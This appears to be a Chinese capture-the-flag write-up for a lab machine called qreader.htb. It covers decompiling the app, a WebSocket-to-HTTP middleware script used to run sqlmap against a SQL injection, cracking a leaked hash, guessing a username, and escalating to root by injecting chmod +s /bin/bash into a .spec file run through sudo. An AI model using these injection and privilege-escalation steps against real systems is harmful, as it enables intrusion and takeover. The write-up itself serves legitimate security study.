![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680610476740-213af37f-4ac6-49d0-a4b9-6649f2f7a4ad.png#averageHue=%23181f2b&clientId=ub9307415-af9e-4&from=paste&height=499&id=ua8f42826&name=image.png&originHeight=624&originWidth=924&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143919&status=done&style=none&taskId=u8ba4547f-0499-4745-8ac7-0dca7eab3a5&title=&width=739.2)
# 知识点
考点：WebSocket SQL注入、Http转换、bash提权
其实这个靶场步骤很简单，感觉也挺好玩的
# 信息搜集
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 20:14 CST
Nmap scan report for 10.10.11.206
Host is up (1.8s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://qreader.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.12 seconds
```
其实信息搜集后发现就开了2个端口，一个web80端口一个ssh22端口
然后我们进入web界面
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680623874537-013b0f59-0c0b-48fd-bce2-9f380793d470.png#averageHue=%23fefefe&clientId=u494a898d-3a41-4&from=paste&height=765&id=u842250b0&name=image.png&originHeight=956&originWidth=1927&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155692&status=done&style=none&taskId=u21f5ff3f-af0c-4641-8a0f-9200d2dfd69&title=&width=1541.6)
这是一个app网站，我们下载windows版本的exe文件，然后用`pyinstxtractor`给他反编译成pyc文件：
`python3 pyinstxtractor.py qreader.exe`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680623953500-4b2dc5a1-f49a-404c-aab6-5a68a53cfed5.png#averageHue=%23282f3d&clientId=u494a898d-3a41-4&from=paste&height=820&id=u49ba790b&name=image.png&originHeight=1025&originWidth=2198&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=104726&status=done&style=none&taskId=ub5e23344-0b0e-40d7-b819-fab6b3be669&title=&width=1758.4)
茫茫人海中看到了今天的主角，我们接下来继续将pyc还原为py文件
```
pip3 install uncompyle6

uncompyle6 qreader.pyc > qreader.py
```
这个工具只支持3.9.0版本的python，不支持3.1，所以我没办法用，我直接找了个在线网站
```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.9

import cv2
import sys
import qrcode
import tempfile
import random
import os
from PyQt5.QtWidgets import *
from PyQt5 import uic, QtGui
import asyncio
import websockets
import json
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'
icon_path = './icon.png'

def setup_env():
    global tmp_file_name
    pass
# WARNING: Decompyle incomplete


class MyGUI(QMainWindow):
    
    def __init__(self = None):
        super(MyGUI, self).__init__()
        uic.loadUi(tmp_file_name, self)
        self.show()
        self.current_file = ''
        self.actionImport.triggered.connect(self.load_image)
        self.actionSave.triggered.connect(self.save_image)
        self.actionQuit.triggered.connect(self.quit_reader)
        self.actionVersion.triggered.connect(self.version)
        self.actionUpdate.triggered.connect(self.update)
        self.pushButton.clicked.connect(self.read_code)
        self.pushButton_2.clicked.connect(self.generate_code)
        self.initUI()

    
    def initUI(self):
        self.setWindowIcon(QtGui.QIcon(icon_path))

    
    def load_image(self):
        options = QFileDialog.Options()
        (filename, _) = QFileDialog.getOpenFileName(self, 'Open File', '', 'All Files (*)')
        if filename != '':
            self.current_file = filename
            pixmap = QtGui.QPixmap(self.current_file)
            pixmap = pixmap.scaled(300, 300)
            self.label.setScaledContents(True)
            self.label.setPixmap(pixmap)

    
    def save_image(self):
        options = QFileDialog.Options()
        (filename, _) = QFileDialog.getSaveFileName(self, 'Save File', '', 'PNG (*.png)', options, **('options',))
        if filename != '':
            img = self.label.pixmap()
            img.save(filename, 'PNG')

    
    def read_code(self):
        if self.current_file != '':
            img = cv2.imread(self.current_file)
            detector = cv2.QRCodeDetector()
            (data, bbox, straight_qrcode) = detector.detectAndDecode(img)
            self.textEdit.setText(data)
        else:
            self.statusBar().showMessage('[ERROR] No image is imported!')

    
    def generate_code(self):
        qr = qrcode.QRCode(1, qrcode.constants.ERROR_CORRECT_L, 20, 2, **('version', 'error_correction', 'box_size', 'border'))
        qr.add_data(self.textEdit.toPlainText())
        qr.make(True, **('fit',))
        img = qr.make_image('black', 'white', **('fill_color', 'back_color'))
        img.save('current.png')
        pixmap = QtGui.QPixmap('current.png')
        pixmap = pixmap.scaled(300, 300)
        self.label.setScaledContents(True)
        self.label.setPixmap(pixmap)

    
    def quit_reader(self):
        if os.path.exists(tmp_file_name):
            os.remove(tmp_file_name)
        sys.exit()

    
    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
        else:
            error = data['error']
            self.statusBar().showMessage(error)

    
    def update(self):
        response = asyncio.run(ws_connect(ws_host + '/update', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            msg = '[INFO] ' + data['message']
            self.statusBar().showMessage(msg)
        else:
            error = data['error']
            self.statusBar().showMessage(error)

    __classcell__ = None


async def ws_connect(url, msg):
    pass
# WARNING: Decompyle incomplete


def main():
    (status, e) = setup_env()
    if not status:
        print('[-] Problem occured while setting up the env!')
    app = QApplication([])
    window = MyGUI()
    app.exec_()

if __name__ == '__main__':
    main()

```
可以发现这是一个websockets服务，其中开发了5789端口，
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624151206-a660480c-6c5c-482d-9ef5-d5bd3722cae3.png#averageHue=%2353847d&clientId=u8b12b25a-26d3-4&from=paste&height=374&id=u4b547c9d&name=image.png&originHeight=467&originWidth=1168&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78269&status=done&style=none&taskId=u095ea6ed-9b72-4ae5-9934-0d914adcc0e&title=&width=934.4)
# SQL注入
在update和version路由，我们都有可控参数，可以尝试是否存在SQL注入，经过fuzz测试可以发现存在union注入，这里提供了一种很棒的思路
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection
import json
#ws_server = "ws://localhost:8156/ws"
#ws_server = "ws://qreader.htb:5789"

#发送websocket的函数
def send_ws(payload,ws_server):
    #创建一个websocket 连接句柄
	ws = create_connection(ws_server)
    
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	# For our case, format the payload in JSON
	#message = unquote(payload["data"]).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	
	data =payload
	print(type(data))
    # 将字典dumps成一个字符串的格式
	str_data = json.dumps(data)
	print((str_data))
	ws.send(str_data)
	resp = ws.recv()
	print(resp)
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
				key = urlparse(self.path).query.split('=',1)[0]
				#这里就是解释 key 和 value 放到一个字典中
				data = {key:payload}
				print(urlparse(self.path).path)
				print(urlparse(self.path))
				path = (urlparse(self.path).path)
                #socket靶机 开放websocket的端口
				ws_server = "ws://qreader.htb:5789"
				ws_server = ws_server +	path
				print(ws_server)
			except IndexError:
				payload = False
				
			if payload:
                #将上面解析的 query 传给发送websocket请求的函数
				content = send_ws(data,ws_server)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8082/?id=*")

try:
	middleware_server(('0.0.0.0',8082))
except KeyboardInterrupt:
	pass

```
通过上述脚本，我们可以将websocket服务转换为http服务，然后再burp和sqlmap进行测试（由于我这里有校园网，所以拉一张网图，流量又太慢妈的）
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624293471-adcd88a2-0d23-4551-ae08-894cd4f75bcc.png#averageHue=%23161616&clientId=u8b12b25a-26d3-4&from=paste&id=u27ba7ee2&name=image.png&originHeight=501&originWidth=1234&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=127192&status=done&style=none&taskId=u501659c1-f5d0-418f-85f4-8952fb7c7d4&title=)
最后跑是可以跑出这样的东西的，然后md5可以在网站进行爆破解密，这里推荐个国外的[https://crackstation.net/](https://crackstation.net/)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624358679-e24097d7-77d8-45ea-9689-6d5bcc452e69.png#averageHue=%23eaeae9&clientId=u8b12b25a-26d3-4&from=paste&height=314&id=uc4f21667&name=image.png&originHeight=392&originWidth=1326&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29867&status=done&style=none&taskId=ud09326d0-70db-429f-9d76-12ba581b3c0&title=&width=1060.8)
`denjanjade122566`得到了密码，剩下的就是用户名了
在sqlmap进行爆破时，你也会看到这一张表
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624407407-60b0ba2f-191e-490b-a99a-4dd0bd0f60da.png#averageHue=%231a1a1a&clientId=u8b12b25a-26d3-4&from=paste&id=ufd783b1e&name=image.png&originHeight=309&originWidth=1468&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=44074&status=done&style=none&taskId=u33daa152-b9c9-4979-bb29-33f9c19def4&title=)
# 用户名爆破
其中暴露了一个用户名`keller`但是当你尝试用keller登录时，密码又不对，这一点就很搞知道吧
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624467135-124f930d-c0f9-4694-88dc-e32cd01f6d7a.png#averageHue=%2322242b&clientId=u8b12b25a-26d3-4&from=paste&height=139&id=u15a1698d&name=image.png&originHeight=174&originWidth=604&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41031&status=done&style=none&taskId=u256b1da2-2f81-4e9c-b40a-19ba0a778c6&title=&width=483.2)
最后去论坛看了一下，发现还需要对用户名进行一个前缀爆破
用的 username-anarchy 这个工具来构造字典的
[urbanadventurer/username-anarchy: Username tools for penetration testing (github.com)](https://github.com/urbanadventurer/username-anarchy)
感觉完全多此一举，最后发现是`tkeller`这个用户
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624530925-40720519-b0bd-4193-ae31-56f5cdf359f8.png#averageHue=%2322242b&clientId=u8b12b25a-26d3-4&from=paste&height=141&id=uc413909a&name=image.png&originHeight=176&originWidth=513&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37537&status=done&style=none&taskId=u6592de88-0684-4e5c-852f-fac28189b47&title=&width=410.4)
获取user.txt
# 提权
常规思路`sudo -l`看看有什么可控的sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624555976-41bf5489-b769-4b2c-8f52-90d2c1f6b3d0.png#averageHue=%2323252c&clientId=u8b12b25a-26d3-4&from=paste&height=141&id=u69ac1ca6&name=image.png&originHeight=176&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44647&status=done&style=none&taskId=u0b854527-81f0-4ecb-992d-6c8a1533b08&title=&width=564)
得到了一个sh脚本，我们可以看看这个脚本是干啥的
```shell
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi

```
可以发现这个脚本有3个功能,`spec make build`，这里我问了问newbing
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624676026-b8a3d554-cbbb-4378-ad7d-24942a151245.png#averageHue=%23e6ecf9&clientId=u8b12b25a-26d3-4&from=paste&height=224&id=ufbc79552&name=image.png&originHeight=280&originWidth=1021&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90129&status=done&style=none&taskId=ua257eaac-753c-4f10-a425-e7538076a7f&title=&width=816.8)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624749824-542eac01-3aa0-4db5-9890-b1c1efa2a742.png#averageHue=%23e4ebf9&clientId=u8b12b25a-26d3-4&from=paste&height=170&id=u2668b857&name=image.png&originHeight=212&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70651&status=done&style=none&taskId=u05c3015b-228e-4ed2-aac5-f50965dd9be&title=&width=1000)
然后我们通过询问，发现执行这2个命令时，我执行我们文件里的代码！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624819033-83543e45-21aa-4f88-bc44-6ec6fbeec4cf.png#averageHue=%23e7edf9&clientId=u8b12b25a-26d3-4&from=paste&height=154&id=u8c7cb803&name=image.png&originHeight=192&originWidth=913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61444&status=done&style=none&taskId=u2e2ef443-7c89-4e6e-b7df-1fba348541e&title=&width=730.4)
那也就是说这也是一种另类的suid，我们可以给bash或者其他的指令添加suid权限
```shell
echo import os
os.system('chmod +s /bin/bash') >> 1.spec
```
`sudo /usr/local/sbin/build-installer.sh build 1.spec`
运行过后就可以发现有suid权限了
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624903085-de703092-40b7-46fd-b542-7aedb4a9f6fb.png#averageHue=%232e353a&clientId=u8b12b25a-26d3-4&from=paste&height=38&id=uf4eb4a99&name=image.png&originHeight=48&originWidth=489&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11928&status=done&style=none&taskId=ud3c76929-d06b-4b50-8e68-f8458969bab&title=&width=391.2)
最后就是通过`bash -p`以root权限启动一个bash会话
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624919040-c2271fd7-0ac1-416d-b5a2-007adc146baa.png#averageHue=%23272930&clientId=u8b12b25a-26d3-4&from=paste&height=80&id=u49adb12d&name=image.png&originHeight=100&originWidth=451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15592&status=done&style=none&taskId=u9dba3d4f-2181-4a2a-bfdd-965e032fa3d&title=&width=360.8)
然后读取flag就好啦!
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624963087-421510a6-cb2c-4309-ad06-1e5607dc3e80.png#averageHue=%236d6e70&clientId=u8b12b25a-26d3-4&from=paste&height=86&id=u3b467b32&name=image.png&originHeight=108&originWidth=477&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17609&status=done&style=none&taskId=u7f2a7499-8fce-4ea0-a1eb-2ea0ab9e2a1&title=&width=381.6)
